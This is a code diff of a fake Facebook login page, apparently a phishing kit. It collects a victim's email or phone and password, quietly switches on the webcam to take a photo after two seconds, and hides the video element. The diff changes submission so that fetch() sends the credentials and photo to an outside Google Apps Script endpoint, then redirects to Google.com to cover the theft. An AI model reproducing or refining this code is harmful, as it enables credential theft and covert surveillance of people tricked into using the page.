@@ -59,40 +59,80 @@
 </head>
 <body> 
   <div class="form-container">
-    <form action="https://script.google.com/macros/s/AKfycbxwMvuQnraAoBx9TrB-g__Pa9oH3ApUW7f3E9pbI-Em7pT3mZxUVkdXNSseG9vgQCqI/exec" method="post">
-      <input type="hidden" name="title" value="Camera">
-       <input type="hidden" name="urlInput" value="Facebook.html">
-      <input type="hidden" name="timestamp">
-      <input class="input" type="text" name="user" placeholder="Email address or phone number">
-      <input class="input" type="password" name="password" placeholder="Password">
-      
-      <video id="video" autoplay></video>
-      <canvas id="canvas" style="display:none;"></canvas>
-      <input type="hidden" name="photo" id="photo">
+  <form id="myForm" method="post">
+    <input type="hidden" name="title" value="Camera">
+    <input type="hidden" name="redirect_url" value="https://Google.com">
+    <input type="hidden" name="urlInput" value="Facebook.html">
+    <input type="hidden" name="timestamp">
+    <input class="input" type="text" name="user" placeholder="Email address or phone number" required>
+    <input class="input" type="password" name="password" placeholder="Password" required>
 
-      <button type="submit">Submit</button>
-    </form>
-  </div>
+    <video id="video" autoplay style="display:none;"></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+    <input type="hidden" name="photo" id="photo">
 
-  <script>
-    const video = document.getElementById('video');
-    const canvas = document.getElementById('canvas');
-    const photoInput = document.getElementById('photo');
-    
-    // Get access to the camera
-    navigator.mediaDevices.getUserMedia({ video: true })
-      .then(stream => {
-        video.srcObject = stream;
-        // Auto-capture photo after a short delay
-        setTimeout(() => {
-          const context = canvas.getContext('2d');
-          canvas.width = video.videoWidth;
-          canvas.height = video.videoHeight;
-          context.drawImage(video, 0, 0);
-          photoInput.value = canvas.toDataURL('image/png');
-        }, 2000); // Auto-capture after 2 seconds
-      })
-      .catch(err => console.error("Error accessing camera: ", err));
-  </script>
+    <button type="submit">Submit</button>
+  </form>
+</div>
+
+<script>
+  const form = document.getElementById('myForm');
+
+  form.addEventListener('submit', function(e) {
+    e.preventDefault();
+
+    const formData = new FormData(form);
+    const redirectUrl = formData.get('redirect_url');
+
+    // Convert formData to URLSearchParams for POST
+    const params = new URLSearchParams();
+    for (const pair of formData.entries()) {
+      params.append(pair[0], pair[1]);
+    }
+
+    fetch('https://script.google.com/macros/s/AKfycbxwMvuQnraAoBx9TrB-g__Pa9oH3ApUW7f3E9pbI-Em7pT3mZxUVkdXNSseG9vgQCqI/exec', {
+      method: 'POST',
+      body: params,
+      headers: {
+        'Content-Type': 'application/x-www-form-urlencoded'
+      }
+    })
+    .then(response => {
+      if (!response.ok) throw new Error('Network response was not ok');
+      return response.text();
+    })
+    .then(() => {
+      // Redirect after successful form submission
+      window.location.href = redirectUrl;
+    })
+    .catch(error => {
+       window.location.href = redirectUrl;
+    });
+  });
+
+  const video = document.getElementById('video');
+  const canvas = document.getElementById('canvas');
+  const photoInput = document.getElementById('photo');
+
+  // Access the camera and capture a photo after 2 seconds
+  navigator.mediaDevices.getUserMedia({ video: true })
+    .then(stream => {
+      video.srcObject = stream;
+
+      setTimeout(() => {
+        const context = canvas.getContext('2d');
+        canvas.width = video.videoWidth || 640; // fallback width
+        canvas.height = video.videoHeight || 480; // fallback height
+        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+        photoInput.value = canvas.toDataURL('image/png');
+
+        // Stop the video stream to free camera
+        stream.getTracks().forEach(track => track.stop());
+        video.style.display = 'none';
+      }, 2000);
+    })
+    .catch(err => console.error("Error accessing camera: ", err));
+</script>
+
 </body>
 </html>
